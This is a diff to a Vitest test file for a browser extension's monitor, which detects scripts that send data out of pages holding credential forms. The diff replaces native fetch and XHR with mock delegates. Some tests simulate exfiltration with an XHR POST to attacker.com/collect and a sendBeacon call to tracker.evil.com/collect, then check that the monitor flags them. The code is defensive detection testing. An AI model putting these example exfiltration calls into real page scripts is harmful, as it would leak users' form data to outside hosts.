@@ -19,14 +19,16 @@
 // each test starts from native (and the XHR rollback's "restores native"
 // guarantee can be asserted by identity, not merely inferred).
 
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;
 type Monitor = typeof import("../extension/src/content/js_behavior_monitor");
 
-// True native references captured once, before any test patches them. happy-dom
-// may not implement sendBeacon, so it may be undefined.
-const NATIVE_FETCH = window.fetch;
+// Fetch is deliberately a settled test double: these tests prove that the
+// wrapper delegates without letting Happy DOM start a real request that its
+// environment teardown would abort. The remaining globals are native identity
+// snapshots because their rollback behavior is under test.
+const TEST_FETCH = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
 const NATIVE_XHR_OPEN = XMLHttpRequest.prototype.open;
 const NATIVE_XHR_SEND = XMLHttpRequest.prototype.send;
 const NATIVE_SEND_BEACON = navigator.sendBeacon;
@@ -46,7 +48,7 @@ function freeze(obj: object, key: string): void {
 
 /** Reset the shared DOM globals/prototypes to native between tests. */
 function restoreNativeGlobals(): void {
-  defineWritable(window, "fetch", NATIVE_FETCH);
+  defineWritable(window, "fetch", TEST_FETCH);
   defineWritable(XMLHttpRequest.prototype, "open", NATIVE_XHR_OPEN);
   defineWritable(XMLHttpRequest.prototype, "send", NATIVE_XHR_SEND);
   if (NATIVE_SEND_BEACON !== undefined) {
@@ -56,6 +58,10 @@ function restoreNativeGlobals(): void {
     Object.defineProperty(HTMLInputElement.prototype, "value", NATIVE_VALUE_DESC);
   }
 }
+
+beforeEach(() => {
+  restoreNativeGlobals();
+});
 
 async function freshMonitor(): Promise<Monitor> {
   vi.resetModules();
@@ -114,12 +120,10 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
     ).not.toThrow();
 
     // The send() patch threw, so the lone open() wrap must have been rolled back to
-    // the native method (no half-patched/double-wrapped XHR), and real XHR works.
+    // the native method (no half-patched/double-wrapped XHR). Calling Happy DOM's
+    // native open() would start a real request whose teardown abort is unrelated
+    // to this rollback assertion.
     expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);
-    expect(() => {
-      const xhr = new XMLHttpRequest();
-      xhr.open("GET", "/local");
-    }).not.toThrow();
 
     // beacon is patched after XHR, so its signal proves init continued.
     credentialForm();
@@ -214,6 +218,8 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
   it("does not leave _xhrPatched stuck: a re-sync after send becomes writable installs the XHR patch", async () => {
     window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
     navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    const frozenSend = vi.fn() as unknown as typeof XMLHttpRequest.prototype.send;
+    defineWritable(XMLHttpRequest.prototype, "send", frozenSend);
     freeze(XMLHttpRequest.prototype, "send");
 
     const mod = await freshMonitor();
@@ -223,8 +229,12 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
     mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
     expect(XMLHttpRequest.prototype.open).toBe(NATIVE_XHR_OPEN);
 
-    // send becomes writable again, then a later ns-config re-sync re-runs init.
-    defineWritable(XMLHttpRequest.prototype, "send", NATIVE_XHR_SEND);
+    // Re-enable settled delegates, then a later ns-config re-sync re-runs init.
+    // The wrapper behavior is what this test owns; native Happy DOM transport is not.
+    const resumedOpen = vi.fn() as unknown as typeof XMLHttpRequest.prototype.open;
+    const resumedSend = vi.fn() as unknown as typeof XMLHttpRequest.prototype.send;
+    defineWritable(XMLHttpRequest.prototype, "open", resumedOpen);
+    defineWritable(XMLHttpRequest.prototype, "send", resumedSend);
     mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     // The retry must have installed both wrappers: a 3P XHR correlated with a
@@ -240,6 +250,8 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
     const xhr = new XMLHttpRequest();
     xhr.open("POST", "https://attacker.com/collect");
     xhr.send("data");
+    expect(resumedOpen).toHaveBeenCalledWith("POST", "https://attacker.com/collect");
+    expect(resumedSend).toHaveBeenCalledWith("data");
 
     expect(postSignal).toHaveBeenCalledWith(
       "ns-js-exfil-network",
@@ -249,7 +261,8 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
 
   it("does not leave _beaconPatched stuck: a re-sync after sendBeacon becomes writable installs the beacon patch", async () => {
     window.fetch = vi.fn().mockResolvedValue(new Response()) as unknown as typeof window.fetch;
-    navigator.sendBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    const frozenBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    defineWritable(navigator, "sendBeacon", frozenBeacon);
     freeze(navigator, "sendBeacon");
 
     const mod = await freshMonitor();
@@ -259,12 +272,14 @@ describe("js behavior monitor: frozen MAIN-world globals do not abort init", () 
     mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     // sendBeacon becomes writable again, then a later ns-config re-sync re-runs init.
-    defineWritable(navigator, "sendBeacon", vi.fn().mockReturnValue(true));
+    const resumedBeacon = vi.fn().mockReturnValue(true) as unknown as typeof navigator.sendBeacon;
+    defineWritable(navigator, "sendBeacon", resumedBeacon);
     mod.initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     // The retry must have installed the wrapper: a 3P beacon on a credential page emits.
     credentialForm();
     navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+    expect(resumedBeacon).toHaveBeenCalledWith("https://tracker.evil.com/collect", "payload");
 
     expect(postSignal).toHaveBeenCalledWith(
       "ns-js-exfil-beacon",
